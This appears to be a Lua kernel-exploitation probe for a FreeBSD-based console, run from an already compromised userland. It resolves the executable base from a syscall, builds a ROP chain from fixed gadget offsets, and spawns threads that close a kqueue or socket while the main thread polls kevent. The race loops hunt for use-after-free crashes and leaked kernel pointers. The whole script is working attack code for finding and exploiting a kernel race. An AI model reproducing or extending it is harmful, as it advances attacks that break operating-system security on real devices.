-- CRASH_CLASS: HIGH
-- PROBE 271i: kqueue diagnostic + timer close race
--
-- 271h got 0 events across 10K+ kevent calls. Before more racing, we need
-- to verify the event pipeline works: socketpair → write → kevent returns event.
-- Then try: EVFILT_TIMER + close(kqueue_fd) from child thread. The timer fires
-- in kernel interrupt context and tries to enqueue on the kqueue that the child
-- just closed — a race between kqueue_close() and timer callback.

print("=== PROBE 271i: kqueue diag + timer race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sc_close = mk(6)
local sc_kqueue = mk(362)
local sc_kevent = mk(363)
local sc_socketpair = mk(135)
local sc_write = mk(4)
local sc_read = mk(3)
local sc_socket = mk(97)
local sc_thr_new = mk(455)

-- Eboot + gadgets (from 271g: pop_rax_ret=+0x992, pop_rdi_rbp_ret=+0x169, bare_ret=+0x42)
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eboot_lo = rd(N(info) + 0x108)
local eboot_hi = rd(N(info) + 0x10C)
local eboot_base = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
print("eboot=" .. fmt_addr(eboot_base))

local g_pop_rax_ret = eboot_base + 0x992
local g_pop_rdi_rbp_ret = eboot_base + 0x169
local g_bare_ret = eboot_base + 0x42

-- ROP stack for child thread close
local stack_mem = memory.alloc(0x8000)
local stack_base = N(stack_mem)
local stack_size = 0x4000
local rsp = stack_base + stack_size - 8

local param = memory.alloc(0x40)
local pa = N(param)
for i = 0, 0x3C, 4 do wd(pa + i, 0) end
wq(pa + 0x00, g_bare_ret)
wq(pa + 0x10, uint64(stack_base))
wq(pa + 0x18, uint64(stack_size))
local child_tid = memory.alloc(8)
wq(pa + 0x30, child_tid)

local function spawn_close(fd_val)
    wq(rsp,      g_pop_rax_ret)
    wq(rsp + 8,  uint64(6))        -- SYS_close
    wq(rsp + 16, stub)
    wq(rsp + 24, g_pop_rdi_rbp_ret)
    wq(rsp + 32, uint64(0))
    wq(rsp + 40, uint64(0))
    wq(rsp + 48, g_pop_rax_ret)
    wq(rsp + 56, uint64(431))      -- SYS_thr_exit
    wq(rsp + 64, stub)
    wq(pa + 0x08, uint64(fd_val))
    wq(N(child_tid), uint64(0))
    pcall(function() sc_thr_new(param, uint64(0x38)) end)
end

-- Buffers
local changelist = memory.alloc(0x40)
local eventlist = memory.alloc(0x200)
local timeout = memory.alloc(0x10)
local ca = N(changelist)
local ea = N(eventlist)
local ta = N(timeout)
local data_buf = memory.alloc(16)
wd(N(data_buf), 0x41424344)
local sv = memory.alloc(8)

-- ============================================================
-- [A] DIAGNOSTIC: verify socketpair + write + kevent pipeline
-- ============================================================
print("")
print("[A] diagnostic: socketpair + write + kevent")

local ok_kq, kq_rv = pcall(function() return sc_kqueue() end)
local kq_fd = ok_kq and N(kq_rv) or -1
print("  kqueue fd=" .. kq_fd)

-- socketpair
for i = 0, 4, 4 do wd(N(sv) + i, 0xFFFFFFFF) end
local ok_sp, sp_rv = pcall(function()
    return sc_socketpair(uint64(1), uint64(2), uint64(0), sv)
end)
print("  socketpair ret=" .. (ok_sp and N(sp_rv) or "FAIL"))
local fd0 = rd(N(sv))
local fd1 = rd(N(sv) + 4)
print("  fd0=" .. (fd0 or "nil") .. " fd1=" .. (fd1 or "nil"))

if fd0 and fd1 and fd0 >= 0 and fd1 >= 0 then
    -- Register EVFILT_READ on fd1
    wq(ca, uint64(fd1))
    wd(ca + 8, 0x0001FFFF)  -- filter=EVFILT_READ(-1), flags=EV_ADD
    wd(ca + 12, 0)
    wq(ca + 16, uint64(0))
    wq(ca + 24, uint64(0xAAAA))

    local ok_r, rv_r = pcall(function()
        return sc_kevent(uint64(kq_fd), changelist, uint64(1), uint64(0), uint64(0), uint64(0))
    end)
    print("  register ret=" .. (ok_r and N(rv_r) or "FAIL"))

    -- Write to fd0
    local ok_w, rv_w = pcall(function()
        return sc_write(uint64(fd0), data_buf, uint64(4))
    end)
    print("  write(fd0) ret=" .. (ok_w and N(rv_w) or "FAIL"))

    -- kevent with 0 timeout (should return immediately with event)
    wq(ta, uint64(0)); wq(ta + 8, uint64(0))
    for off = 0, 0xFC, 4 do wd(ea + off, 0xDEAD0000) end

    local ok_e, rv_e = pcall(function()
        return sc_kevent(uint64(kq_fd), uint64(0), uint64(0), eventlist, uint64(4), timeout)
    end)
    local nev = ok_e and N(rv_e) or -999
    print("  kevent nev=" .. nev)

    if nev > 0 then
        -- Dump the event
        local id_lo = rd(ea) or 0
        local id_hi = rd(ea + 4) or 0
        local fl = rd(ea + 8) or 0
        local ffl = rd(ea + 12) or 0
        local dt_lo = rd(ea + 16) or 0
        local dt_hi = rd(ea + 20) or 0
        local ud_lo = rd(ea + 24) or 0
        local ud_hi = rd(ea + 28) or 0
        print(string.format("  event: id=%08X%08X fl=%08X ffl=%08X dt=%08X%08X ud=%08X%08X",
            id_hi, id_lo, fl, ffl, dt_hi, dt_lo, ud_hi, ud_lo))
    else
        print("  *** NO EVENT — pipeline broken ***")

        -- Try reading directly
        local read_buf = memory.alloc(16)
        local ok_rd, rv_rd = pcall(function()
            return sc_read(uint64(fd1), read_buf, uint64(8))
        end)
        print("  read(fd1) ret=" .. (ok_rd and N(rv_rd) or "FAIL"))
    end

    pcall(function() sc_close(uint64(fd0)) end)
    pcall(function() sc_close(uint64(fd1)) end)
end
pcall(function() sc_close(uint64(kq_fd)) end)

-- Also try: UDP socket + kevent (what probes 20/21 used)
print("")
print("[A2] diagnostic: UDP socket + kevent")
local ok_kq2, kq2 = pcall(function() return sc_kqueue() end)
local kq2_fd = ok_kq2 and N(kq2) or -1

local ok_udp, udp_rv = pcall(function()
    return sc_socket(uint64(2), uint64(2), uint64(0))
end)
local udp_fd = ok_udp and N(udp_rv) or -1
print("  udp fd=" .. udp_fd)

if udp_fd >= 0 and kq2_fd >= 0 then
    wq(ca, uint64(udp_fd))
    wd(ca + 8, 0x0001FFFF)
    wd(ca + 12, 0)
    wq(ca + 16, uint64(0))
    wq(ca + 24, uint64(0xBBBB))

    local ok_rg, rv_rg = pcall(function()
        return sc_kevent(uint64(kq2_fd), changelist, uint64(1), uint64(0), uint64(0), uint64(0))
    end)
    print("  register ret=" .. (ok_rg and N(rv_rg) or "FAIL"))

    -- Try EVFILT_TIMER instead: filter=-7 (0xFFF9), flags=EV_ADD, data=1 (1ms)
    wq(ca, uint64(42))       -- ident = arbitrary timer id
    wd(ca + 8, 0x0001FFF9)   -- filter=-7 (EVFILT_TIMER), flags=EV_ADD
    wd(ca + 12, 0)
    wq(ca + 16, uint64(1))   -- data = 1ms period
    wq(ca + 24, uint64(0xCCCC))

    local ok_tm, rv_tm = pcall(function()
        return sc_kevent(uint64(kq2_fd), changelist, uint64(1), uint64(0), uint64(0), uint64(0))
    end)
    print("  timer register ret=" .. (ok_tm and N(rv_tm) or "FAIL"))

    -- Wait 5ms, then poll
    for w = 1, 2000 do local _ = rd(stack_base) end

    wq(ta, uint64(0)); wq(ta + 8, uint64(0))
    for off = 0, 0xFC, 4 do wd(ea + off, 0xDEAD0000) end

    local ok_e2, rv_e2 = pcall(function()
        return sc_kevent(uint64(kq2_fd), uint64(0), uint64(0), eventlist, uint64(4), timeout)
    end)
    local nev2 = ok_e2 and N(rv_e2) or -999
    print("  timer kevent nev=" .. nev2)

    if nev2 > 0 then
        for ei = 0, nev2 - 1 do
            local bo = ei * 32
            local id_lo = rd(ea + bo) or 0
            local fl = rd(ea + bo + 8) or 0
            local dt_lo = rd(ea + bo + 16) or 0
            local ud_lo = rd(ea + bo + 24) or 0
            print(string.format("  event[%d]: id=%d fl=0x%08X dt=%d ud=0x%X",
                ei, id_lo, fl, dt_lo, ud_lo))
        end
    end
end

if not alive() then print("DEAD after diagnostics"); return end

-- ============================================================
-- [B] TIMER RACE: close kqueue while timer is active
-- ============================================================
print("")
print("[B] timer race: close kqueue from child while timer fires")

local anom_b = 0
local crashes_b = 0

for iter = 1, 100 do
    if not alive() then
        print("DEAD at iter " .. iter)
        crashes_b = crashes_b + 1
        break
    end

    -- Fresh kqueue
    local ok_kq3, kq3 = pcall(function() return sc_kqueue() end)
    local kq3_fd = ok_kq3 and N(kq3) or -1
    if kq3_fd < 0 then break end

    -- Register EVFILT_TIMER with 1ms period
    wq(ca, uint64(iter))          -- ident = iter
    wd(ca + 8, 0x0001FFF9)       -- filter=-7 (EVFILT_TIMER), flags=EV_ADD
    wd(ca + 12, 0)
    wq(ca + 16, uint64(1))       -- data = 1ms
    wq(ca + 24, uint64(0))

    pcall(function()
        sc_kevent(uint64(kq3_fd), changelist, uint64(1), uint64(0), uint64(0), uint64(0))
    end)

    -- Spawn child to close the KQUEUE fd
    spawn_close(kq3_fd)

    -- Main: try to poll events from the (maybe-closed) kqueue
    for off = 0, 0xFC, 4 do wd(ea + off, 0xDEAD0000) end
    wq(ta, uint64(0)); wq(ta + 8, uint64(5000000))  -- 5ms timeout

    local ok_ev, rv_ev = pcall(function()
        return sc_kevent(uint64(kq3_fd), uint64(0), uint64(0), eventlist, uint64(4), timeout)
    end)
    local nev = ok_ev and N(rv_ev) or -999

    if nev > 0 then
        for ei = 0, nev - 1 do
            local bo = ei * 32
            local id_hi = rd(ea + bo + 4) or 0
            local id_lo = rd(ea + bo) or 0
            local dt_hi = rd(ea + bo + 20) or 0
            local dt_lo = rd(ea + bo + 16) or 0

            local uhi = id_hi; if uhi < 0 then uhi = uhi + 0x100000000 end
            if uhi >= 0xFFFF8000 and uhi < 0xFFFFFFFF then
                anom_b = anom_b + 1
                print(string.format("*** B-KPTR iter=%d ident=0x%08X%08X ***", iter, id_hi, id_lo))
            end
            local dhi = dt_hi; if dhi < 0 then dhi = dhi + 0x100000000 end
            if dhi >= 0xFFFF8000 and dhi < 0xFFFFFFFF then
                anom_b = anom_b + 1
                print(string.format("*** B-KPTR iter=%d data=0x%08X%08X ***", iter, dt_hi, dt_lo))
            end
        end
    end

    for w = 1, 300 do local _ = rd(stack_base) end
    pcall(function() sc_close(uint64(kq3_fd)) end)

    if iter % 25 == 0 then
        print(string.format("  B: iter=%d anom=%d alive=%s", iter, anom_b, alive() and "yes" or "NO"))
    end
end

if not alive() then print("DEAD after phase B"); return end

-- ============================================================
-- [C] SOCKET + TIMER COMBO: register both, close socket from child
-- while timer wakes up kevent processing
-- ============================================================
print("")
print("[C] socket+timer combo race (100 iterations)")

local anom_c = 0
local events_c = 0

for iter = 1, 100 do
    if not alive() then print("DEAD at iter " .. iter); break end

    local ok_kq4, kq4 = pcall(function() return sc_kqueue() end)
    local kq4_fd = ok_kq4 and N(kq4) or -1
    if kq4_fd < 0 then break end

    -- Create a socket to monitor
    local ok_sk, sk_rv = pcall(function()
        return sc_socket(uint64(2), uint64(2), uint64(0))
    end)
    local s_fd = ok_sk and N(sk_rv) or -1
    if s_fd < 0 then pcall(function() sc_close(uint64(kq4_fd)) end); break end

    -- Register EVFILT_READ on socket
    wq(ca, uint64(s_fd))
    wd(ca + 8, 0x0001FFFF)  -- EVFILT_READ, EV_ADD
    wd(ca + 12, 0)
    wq(ca + 16, uint64(0))
    wq(ca + 24, uint64(0xFACE0000 + iter))
    pcall(function()
        sc_kevent(uint64(kq4_fd), changelist, uint64(1), uint64(0), uint64(0), uint64(0))
    end)

    -- Also register a 1ms timer (to generate kernel wakeups)
    wq(ca, uint64(0x100 + iter))
    wd(ca + 8, 0x0001FFF9)  -- EVFILT_TIMER, EV_ADD
    wd(ca + 12, 0)
    wq(ca + 16, uint64(1))  -- 1ms
    wq(ca + 24, uint64(0))
    pcall(function()
        sc_kevent(uint64(kq4_fd), changelist, uint64(1), uint64(0), uint64(0), uint64(0))
    end)

    -- Spawn child to close the SOCKET fd (not kqueue)
    spawn_close(s_fd)

    -- Main: kevent with 10ms timeout — timer generates events while child closes socket
    wq(ta, uint64(0)); wq(ta + 8, uint64(10000000))  -- 10ms
    for off = 0, 0xFC, 4 do wd(ea + off, 0xDEAD0000) end

    local ok_ev, rv_ev = pcall(function()
        return sc_kevent(uint64(kq4_fd), uint64(0), uint64(0), eventlist, uint64(8), timeout)
    end)
    local nev = ok_ev and N(rv_ev) or -999

    if nev > 0 then
        events_c = events_c + nev
        for ei = 0, nev - 1 do
            local bo = ei * 32
            local id_lo = rd(ea + bo) or 0
            local id_hi = rd(ea + bo + 4) or 0
            local fl = rd(ea + bo + 8) or 0
            local dt_lo = rd(ea + bo + 16) or 0
            local dt_hi = rd(ea + bo + 20) or 0
            local ud_lo = rd(ea + bo + 24) or 0
            local ud_hi = rd(ea + bo + 28) or 0

            -- Kernel pointer checks
            local function ckp(name, hi, lo)
                local uhi = hi; if uhi < 0 then uhi = uhi + 0x100000000 end
                if uhi >= 0xFFFF8000 and uhi < 0xFFFFFFFF then
                    anom_c = anom_c + 1
                    print(string.format("*** C-KPTR iter=%d ev=%d %s=0x%08X%08X ***",
                        iter, ei, name, hi, lo))
                end
            end
            ckp("ident", id_hi, id_lo)
            ckp("data", dt_hi, dt_lo)
            ckp("udata", ud_hi, ud_lo)

            -- Stale ident (not socket fd and not timer id)
            if id_hi == 0 and id_lo ~= s_fd and id_lo ~= (0x100 + iter) then
                anom_c = anom_c + 1
                print(string.format("*** C-STALE iter=%d ev=%d ident=%d ***", iter, ei, id_lo))
            end
        end
    end

    for w = 1, 300 do local _ = rd(stack_base) end
    pcall(function() sc_close(uint64(s_fd)) end)
    pcall(function() sc_close(uint64(kq4_fd)) end)

    if iter % 25 == 0 then
        print(string.format("  C: iter=%d ev=%d anom=%d alive=%s",
            iter, events_c, anom_c, alive() and "yes" or "NO"))
    end
end

print("")
print("=== SUMMARY ===")
print(string.format("Phase B (timer race):        anom=%d crashes=%d", anom_b, crashes_b))
print(string.format("Phase C (socket+timer combo): ev=%d anom=%d", events_c, anom_c))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 271i COMPLETE ===")
